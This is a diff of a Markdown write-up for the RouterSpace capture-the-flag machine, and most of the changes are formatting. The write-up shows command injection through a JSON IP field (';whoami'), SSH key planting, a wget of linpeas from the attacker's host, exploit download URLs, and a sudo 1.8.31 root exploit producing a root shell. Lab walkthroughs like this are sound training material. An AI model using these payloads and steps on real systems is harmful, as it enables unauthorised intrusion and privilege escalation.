@@ -91,7 +91,7 @@ https://build.anbox.io/android-images/2018/07/19/
 
 Once anbox was installed, i installed the `routerspace.apk` package into anbox using:
 
-```adb install routerspace.apk```
+`adb install routerspace.apk`
 
 I then launched anbox, ran routerspace and was presented with an application screen with a "Check Status" button:
 
@@ -114,8 +114,11 @@ Now when clicking "Check Status", burp caught the POST request and returned the 
 
 I then sent this request to repeater, and played around with the request. By editing the JSON ip field, and inputting a `;`, i was able to input a command and the remote target would execute it. For this POST request, i used `"IP":";whoami"`, and in the responce received `"\npaul\n"`. 
 ![](/assets/img/Icons/RouterSpace/burp-lspaul.png)
+
 Knowing that the user is Paul, lets have a look inside his directory:
+
 ![](/assets/img/Icons/RouterSpace/burp-whoami.png)
+
 We can see a user.txt, but when trying to cat it, the resulting hash is the incorrect flag.
 ## Exploiting RouterSpace
 From here, i tried executing different commands to attempt to launch a reverse shell, but i was unable too. This got me thinking about a potential SSH foothold, due to port 22 being open. Lets see if Paul has a .ssh directory
@@ -127,7 +130,7 @@ There is a .ssh directory, but there is no public `id_rsa` key within it, which 
 
 ### SSH Key Generation
 To generate the keys needed, i ran `ssh-keygen` within the `.ssh` directory.
-```
+<pre>
 ┌──(root💀Kali)-[~/.ssh]
 └─# ssh-keygen                                                                             
 Generating public/private rsa key pair.
@@ -150,11 +153,11 @@ The key's randomart image is:
 |                 |
 |                 |
 +----[SHA256]-----+
-```
+</pre>
 
 And now below we can see our key.
 
-```
+<pre>
 ┌──(root💀NTAKali)-[~/.ssh]
 └─# ls                                                                                     
 id_rsa  id_rsa.pub
@@ -162,7 +165,7 @@ id_rsa  id_rsa.pub
 ┌──(root💀NTAKali)-[~/.ssh]
 └─# cat id_rsa.pub
 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCkJAfyFYWN+xxa7v9qNUnVn4ZXLS7HMrfLQ3z8ioTH19CSa/CeSLo2oFQcXQ4CJ3UFvETOVHKl03CLF5aIGBMZxjVHdTr66ZtrKSMVuwP7D/JuyV+m9n/kL/wKS/o+c7AgwjNCLH0MDdbPA83UwSSIGDw4jtxEMf0hIzQ+Vqn9bg8F8DX49yXEVml1biEdEOAgEEJw/Wi6nvkRzcZOxijqNfyDjCWdJP0+AlVwfpp73M/9txs1B2SminwOd7YA+Wpc27cV6/O4vSQr/FgiIi3p9h2NYbnGwyRIvOiUM+gz1nQb5VXs2PKvY8t3wRvPpquzZXis/QgLo3d8TyvDQ/xkStezvdN1YRqLQTnwXJI/mQSfHuF2jwE6mksyEqJjv9aSzKlwblqCCTO3Jl3EtO4/cZz4aaYmhYuJ60RmsHm6wuPzRzG+Fe5NPWKEZVS+HrV+xHlc0gvZ9qLx57cLIPV0jwXkys+Q22jashzB3LfwrDMGp/bMaCCj25nUzS3KP8E= root@NTAKali
-```
+</pre>
 
 ### Adding key to target host
 Using burp, i can echo the key into the `.ssh` directory, in a file called `authoried_keys` using:
@@ -216,16 +219,17 @@ paul@routerspace:~$
 Once SSH'd in, it's as simple as reading the user.txt file.
 <pre>
 paul@routerspace:~$ cat user.txt
-*a*6e7db55**55b726a36f***04f7d6*</pre>
+*a*6e7db55**55b726a36f***04f7d6*
+</pre>
 
 ## Priveledge Esculation
 Once i had gained a foothold, i attempted to download `linpeas.sh` on the target host. However after setting up the python server, the target host was unable to connect to it to download the file.
 
-```paul@routerspace:~$ wget http://10.10.14.49:4444/linpeas.sh
+<pre>paul@routerspace:~$ wget http://10.10.14.49:4444/linpeas.sh
 --2022-03-08 00:34:13--  http://10.10.14.49:4444/linpeas.sh
 Connecting to 10.10.14.49:4444... ^C
-paul@routerspace:~$ 
-```
+paul@routerspace:~$
+</pre>
 
 Instead, i can use Secure Copy `scp` to upload the file from my local host to the target host over port 22.
 
@@ -235,8 +239,8 @@ Instead, i can use Secure Copy `scp` to upload the file from my local host to th
 
 Initially, i attempted to use PwnKit on the machine, as linpeas recommended it.
 
-```
-╔══════════╣ Executing Linux Exploit Suggester
+
+<pre>╔══════════╣ Executing Linux Exploit Suggester
 ╚ https://github.com/mzet-/linux-exploit-suggester                                                
 [+] [CVE-2021-4034] PwnKit                                                                        
 
@@ -267,7 +271,7 @@ Initially, i attempted to use PwnKit on the machine, as linpeas recommended it.
    Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
    ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
    Comments: ip_tables kernel module must be loaded
-```
+</pre>
 
 
 After looking through linpeas again, i noticed that the host is running a vulnerable version of sudo `1.8.31`, but for some reason linpeas didn't report the CVE issue. 
@@ -279,7 +283,8 @@ https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit
 
 After downloading the file to my host machine and unzipping it, i transffered the files over via scp like before. After, i ran `make` which created an `exploit` executable. Running this executable elevated me to root!
 
-```
+
+<pre>
 paul@routerspace:~/test$ make
 mkdir libnss_x
 cc -O3 -shared -nostdlib -o libnss_x/x.so.2 shellcode.c
@@ -289,7 +294,7 @@ exploit  exploit.c  libnss_x  Makefile  shellcode.c
 paul@routerspace:~/test$ ./exploit
 # id
 uid=0(root) gid=0(root) groups=0(root),1001(paul)
-```
+</pre>
 
 ### Root
 Moving to the root directory, we find the root text file.
